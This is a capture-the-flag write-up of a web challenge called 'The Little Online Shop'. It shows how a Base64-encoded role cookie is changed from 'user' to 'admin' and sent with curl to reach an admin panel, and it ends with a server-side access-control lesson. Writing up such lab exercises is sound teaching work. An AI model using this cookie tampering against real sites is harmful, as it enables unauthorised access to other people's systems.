# The Little Online Shop

**Competition:** ITSCyberGame
**Category:** Web
**Connection:** `sfide.itscybergame.it:<port_number>`

---

## Description

> This shop may contain only a few items, but I assure you they are all of INESTIMABLE value.

---

## Solution

### Step 1 — Inspect the source

Opening the shop and viewing the HTML source reveals a hidden comment:

```html
<div style="display:none">
  <!-- TODO: Access admin.php (only if role=admin) -->
</div>
```

There is therefore an `/admin.php` page that should be accessible only to users with the `admin` role.

### Step 2 — Analyze cookies

Using the browser DevTools (F12 → Application → Cookies) we see session cookies. Both names and values are Base64-encoded:

| Cookie name (base64) | Decoded | Cookie value (base64) | Decoded |
|---|---:|---|---:|
| `cm9sZQ==` | `role` | `dXNlcg==` | `user` |
| `dXNlcm5hbWU=` | `username` | *(user value)* | *(username)* |

The server does not validate the role server-side; it blindly trusts the client-provided cookie.

### Step 3 — Cookie tampering

Modify the `cm9sZQ==` cookie value from `dXNlcg==` (`user`) to `YWRtaW4=` (`admin`):

```
base64("role")  = cm9sZQ==
base64("admin") = YWRtaW4=
```

You can change the cookie in DevTools or send a request with the modified cookie, for example with `curl`:

```bash
curl -s http://sfide.itscybergame.it:17191/admin.php \
  -b "cm9sZQ===YWRtaW4="
```

### Step 4 — Access the admin panel

Visiting `/admin.php` with the tampered cookie makes the server accept the role and show the admin panel:

```
Administration Panel
Welcome, User (role: admin)
FLAG: flag{...}
```

---

## Conclusion

This challenge demonstrates the danger of relying on client-side cookies for access control. Base64 is encoding, not encryption: anyone with access to DevTools can read and modify it. Always verify user roles server-side using server-managed sessions rather than trusting client-controlled values.
